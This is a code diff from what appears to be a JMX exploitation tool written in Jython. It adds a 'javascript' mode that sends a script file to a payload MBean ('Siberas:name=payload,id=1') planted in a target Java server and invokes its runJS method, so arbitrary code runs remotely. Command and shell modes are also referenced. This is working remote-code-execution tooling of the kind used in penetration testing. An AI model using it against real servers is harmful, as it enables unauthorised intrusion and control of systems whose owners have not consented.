@@ -161,17 +161,43 @@ def executeCommand(cmd, bean_server):
 
 ### /COMMAND MODE ###
 
-### SCRIPT MODE ###
+### JAVASCRIPT MODE ###
 
 def scriptMode(args):
     bean_server = connectToJMX(args)
 
-    lines = [line.rstrip('\n') for line in open(args.filename)]
+    with open(args.filename, 'r') as myfile:
+        script=myfile.read().replace('\n', ' ')
 
-    for cmd in lines:
-        executeCommand(cmd, bean_server)
+    # print script
+    executeJS(script, bean_server)
 
-### /SCRIPT MODE ###
+
+def executeJS(js, bean_server):
+    # TODO Prettify this
+    # Payload execution
+    # Load the Payload Met and invoke a method on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    print "[+] Loaded " + str(mlet_bean.getClassName())
+
+    print "[+] Executing script"
+    inv_array1 = jarray.zeros(1, Object)
+    inv_array1[0] = js
+
+    inv_array2 = jarray.zeros(1, String)
+    inv_array2[0] = String.canonicalName
+
+    # resource = 
+    bean_server.invoke(mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)
+
+    # this is ugly, and I need to find a better solution for that...
+    # sys.stdout.write(resource)
+
+    sys.stdout.write("\n")
+    sys.stdout.flush()
+
+
+### /JAVASCRIPT MODE ###
 
 
 ### SHELL MODE ###
@@ -226,9 +252,9 @@ command_subparser = subparsers.add_parser('command', help='execute a command in 
 command_subparser.add_argument('cmd', help='command to be executed')
 command_subparser.set_defaults(func=arg_command_mode)
 
-# Script mode
-script_subparser = subparsers.add_parser('script', help='execute a script from a file in the target')
-script_subparser.add_argument('filename', help='file with the script to be executed')
+# Javascript mode
+script_subparser = subparsers.add_parser('javascript', help='execute a javascript from a file in the target')
+script_subparser.add_argument('filename', help='file with the javascript to be executed')
 script_subparser.set_defaults(func=arg_script_mode)
 
 # Shell mode
